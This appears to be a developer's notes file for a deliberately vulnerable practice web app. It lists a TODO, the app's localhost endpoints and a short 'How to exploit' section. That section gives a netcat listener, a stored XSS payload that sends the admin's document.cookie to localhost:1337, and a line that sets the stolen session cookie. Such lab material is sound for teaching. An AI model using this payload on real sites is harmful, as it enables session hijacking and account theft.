TODO:
* Shell script that mimics admin checking mail (needs to have cookie and use Javascript)
* Rename & secure h2 console endpoint


How to exploit:
* nc -lvp 1337
* <script>a = new Image();a.src="http://localhost:1337/?cookie=" + document.cookie;</script>
* document.cookie="guid=b8afc16b-1b1e-4a79-825b-360f141fa0f8"

Pages:
http://localhost:8080/ - Get - Form to post message to admin
http://localhost:8080/ - Post - Form submission
http://localhost:8080/numberOfMessages - Total number of messages in the database (for shell script to loop)
http://localhost:8080/mail/{id} - Get - Retrieve a specific message